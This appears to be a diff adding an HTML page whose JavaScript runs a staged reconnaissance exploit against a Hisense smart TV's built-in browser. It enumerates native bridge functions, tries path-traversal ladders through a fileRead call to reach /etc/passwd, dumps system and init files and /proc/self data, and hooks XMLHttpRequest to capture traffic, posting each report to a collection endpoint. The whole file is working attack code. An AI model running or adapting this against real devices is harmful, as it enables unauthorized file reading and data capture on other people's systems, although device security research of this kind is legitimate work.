@@ -1,0 +1,151 @@
+<!doctype html>
+<!-- alvidaa recon ladder v1..v4 for 55A7KAU / V0000.09.09O.P1015.
+     Staged, incremental POSTs to /api/recon (full report each save, last-writer-wins).
+     No writes to the TV; read-only probes. Each stage gated on the previous one. -->
+<html><head><meta charset="utf-8"><title>recon</title></head>
+<body><pre id="out">recon v1..v4…</pre><script>
+(function () {
+  "use strict";
+  var out = document.getElementById("out");
+  var report = {
+    started: new Date().toISOString(),
+    ua: navigator.userAgent,
+    v1: {}, v2: {}, v3: {}, v4: {}
+  };
+  function trunc(s, n) {
+    s = String(s == null ? "" : s);
+    return s.length > n ? s.slice(0, n) + "…(" + s.length + ")" : s;
+  }
+  function save(tag) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "/api/recon", true);
+      x.setRequestHeader("Content-Type", "application/json");
+      x.send(JSON.stringify({ tag: tag, at: new Date().toISOString(), report: report }));
+      out.textContent = out.textContent + "\n[saved " + tag + "]";
+    } catch (e) { out.textContent = out.textContent + "\n[save failed " + tag + "]"; }
+  }
+  function line(t) { out.textContent = out.textContent + "\n" + t; }
+
+  function hiCall(action, params) {
+    try {
+      if (typeof HiUtils_createRequest !== "function") return { error: "no bridge" };
+      var r = HiUtils_createRequest(action, params);
+      if (r && typeof r === "object" && ("ret" in r)) {
+        return { ret: r.ret, msg: (r.msg == null ? null : String(r.msg)) };
+      }
+      return { value: trunc(r, 500) };
+    } catch (e) { return { exception: String(e) }; }
+  }
+  function isOk(r) {
+    if (r.error || r.exception) return false;
+    var ret = r.ret;
+    if (ret === true) return true;
+    if (typeof ret === "number") return ret !== 0;
+    if (typeof ret === "string") return ret !== "" && ret !== "0";
+    return false;
+  }
+  function rd(path, mode) {
+    var r = hiCall("fileRead", { path: path, mode: (mode || 6) });
+    r.path = path;
+    return r;
+  }
+
+  // ---------- v1: bridge enumeration + sandbox ----------
+  function v1() {
+    var fns = [], hi = [];
+    try {
+      var ks = Object.keys(window);
+      for (var i = 0; i < ks.length; i++) {
+        var k = ks[i];
+        if (/^Hisense_/.test(k) && typeof window[k] === "function") fns.push(k);
+        else if (/^Hi[A-Z]/.test(k) && typeof window[k] === "function") hi.push(k);
+      }
+    } catch (e) { report.v1.enum_error = String(e); }
+    report.v1.hisense_fns = fns;
+    report.v1.hi_utils_fns = hi;
+    report.v1.bridge_present = (typeof HiUtils_createRequest === "function");
+    // sandbox probes: known-good registry file, dir, nonexistent
+    report.v1.probe_appinfo = rd("websdk/Appinfo.json");
+    report.v1.probe_dot = rd("./");
+    report.v1.probe_missing = rd("zzz-nonexistent-probe.txt");
+    report.v1.probe_abs = rd("/etc/passwd");
+    line("v1: fns=" + fns.length + " hi=" + hi.length + " bridge=" + report.v1.bridge_present);
+    save("v1");
+  }
+
+  // ---------- v2: errno leak + traversal ----------
+  var P = null; // traversal prefix that reaches /, or "" if sandbox covers / paths
+  function v2() {
+    report.v2.abs_passwd = rd("/etc/passwd");
+    report.v2.abs_missing = rd("/zzz-not-here");
+    var ladder = ["../etc/passwd", "../../etc/passwd", "../../../../etc/passwd",
+                  "../../../../../../../../etc/passwd", "../..//etc/passwd"];
+    for (var i = 0; i < ladder.length; i++) {
+      var r = rd(ladder[i]);
+      report.v2["ladder_" + i + "_" + ladder[i]] = {
+        ok: isOk(r), ret: r.ret, msg: trunc(r.msg, 400), err: r.exception || r.error || null
+      };
+      if (isOk(r) && P === null) P = ladder[i].replace("etc/passwd", "");
+    }
+    // dir-read behavior with the working prefix
+    if (P !== null) report.v2.dir_probe = rd(P + "etc");
+    line("v2: traversal prefix=" + JSON.stringify(P) +
+         " abs_passwd.ok=" + isOk(report.v2.abs_passwd));
+    save("v2");
+  }
+
+  // ---------- v3: dumps ----------
+  var DUMPS = ["proc/mounts", "etc/inittab", "etc/passwd",
+               "etc/init.d/rcS", "etc/rc.local", "etc/profile"];
+  function v3() {
+    if (P === null) { report.v3.skipped = "no traversal found in v2"; save("v3"); return; }
+    for (var i = 0; i < DUMPS.length; i++) {
+      var r = rd(P + DUMPS[i]);
+      report.v3[DUMPS[i]] = { ok: isOk(r), ret: r.ret, body: isOk(r) ? String(r.msg).slice(0, 65536) : trunc(r.msg, 300) };
+      line("v3: " + DUMPS[i] + (isOk(r) ? " ok (" + String(r.msg).length + "b)" : " fail " + trunc(r.msg, 80)));
+    }
+    save("v3");
+  }
+
+  // ---------- v4: wire capture + self procs ----------
+  var wire = [];
+  function v4() {
+    try {
+      var o = XMLHttpRequest.prototype.open, s = XMLHttpRequest.prototype.send;
+      XMLHttpRequest.prototype.open = function (m, u) {
+        this.__alv = { m: m, u: String(u) };
+        return o.apply(this, arguments);
+      };
+      XMLHttpRequest.prototype.send = function (b) {
+        if (this.__alv && this.__alv.u.indexOf("/api/recon") === -1) {
+          wire.push({ m: this.__alv.m, u: trunc(this.__alv.u, 300),
+                      body: trunc((b == null ? null : (typeof b === "string" ? b : "(binary)")), 4000) });
+        }
+        return s.apply(this, arguments);
+      };
+      report.v4.patched = true;
+    } catch (e) { report.v4.patch_error = String(e); }
+    // stir the bridge so it generates XHR traffic we can capture
+    var stir = rd("websdk/Appinfo.json");
+    report.v4.stir_ok = isOk(stir);
+    setTimeout(function () {
+      report.v4.wire = wire;
+      // self procs via traversal (browser process)
+      report.v4.self_cmdline = rd((P === null ? "" : P) + "proc/self/cmdline");
+      report.v4.self_status = rd((P === null ? "" : P) + "proc/self/status");
+      report.v4.cmdline = isOk(report.v4.self_cmdline) ? String(report.v4.self_cmdline.msg).slice(0, 2000) : trunc(report.v4.self_cmdline.msg, 200);
+      report.v4.status = isOk(report.v4.self_status) ? String(report.v4.self_status.msg).slice(0, 6000) : trunc(report.v4.self_status.msg, 200);
+      line("v4: wire=" + wire.length + " cmdline.ok=" + isOk(report.v4.self_cmdline));
+      save("v4");
+      save("end");
+    }, 2500);
+  }
+
+  // schedule: v1 immediate, v2 after 2s, v3 after 4s, v4 after 6s
+  try { v1(); } catch (e) { report.v1.fatal = String(e); save("v1-fatal"); }
+  setTimeout(function () { try { v2(); } catch (e) { report.v2.fatal = String(e); save("v2-fatal"); } }, 2000);
+  setTimeout(function () { try { v3(); } catch (e) { report.v3.fatal = String(e); save("v3-fatal"); } }, 4000);
+  setTimeout(v4, 6000);
+})();
+</script></body></html>
